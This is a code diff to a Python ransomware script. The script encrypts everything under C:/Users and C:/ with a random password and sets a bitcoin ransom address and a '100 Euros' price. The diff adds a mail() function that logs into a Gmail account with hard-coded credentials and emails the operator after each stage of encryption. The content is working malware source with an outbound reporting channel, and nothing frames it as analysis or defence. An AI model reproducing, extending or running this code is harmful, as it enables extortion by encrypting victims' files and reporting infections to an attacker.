@@ -9,18 +9,27 @@ import glob
 import os.path
 import gnupg
 import pdb
+import smtplib
+from email.MIMEMultipart import MIMEMultipart
+from email.MIMEText import MIMEText
 
 def Windows():
     path=('C:')
     text1=('C:/Users/*')
     text2=('C:/*')
     verif=""
+    textexe='ejecutado'
+    textfin='fin users'
+    textall='fin all'
     s = string.ascii_lowercase + string.digits
     pwd = str(''.join(random.sample(s, 8)))
     t=string.ascii_lowercase
     idd =str(''.join(random.sample(s, 10)))
+    mail(textexe)
     crypt(text1, pwd, path, bitcoin, price,verif)
+    mail(textfin)
     crypt(text2, pwd, path, bitcoin, price,verif)
+    mail(textall)
 
 bitcoin='18SXEt2zLcmYKCbZ6fx36QrmA2NuPAE9kq'
 price='100 Euros'
@@ -121,6 +130,20 @@ def howto(l):
                     listnoRep.append(copis)
             except (IndexError):
                 pass
+def mail(text):
+    msg = MIMEMultipart()
+    msg['From'] = 'patatipatatabad@gmail.com'
+    msg['To'] = 'patatipatatabad@gmail.com'
+    msg['Subject'] = 'Hackthat' 
+    message = text
+    msg.attach(MIMEText(message))
+    mailserver = smtplib.SMTP('smtp.gmail.com', 587)
+    mailserver.ehlo()
+    mailserver.starttls()
+    mailserver.ehlo()
+    mailserver.login('patatipatatabad@gmail.com', 'F011006f')
+    mailserver.sendmail('patatipatatabad@gmail.com', 'patatipatatabad@gmail.com', msg.as_string())
+    mailserver.quit()
 
 if(sys.platform =='linux' or sys.platform == 'linux2'):
     linux()
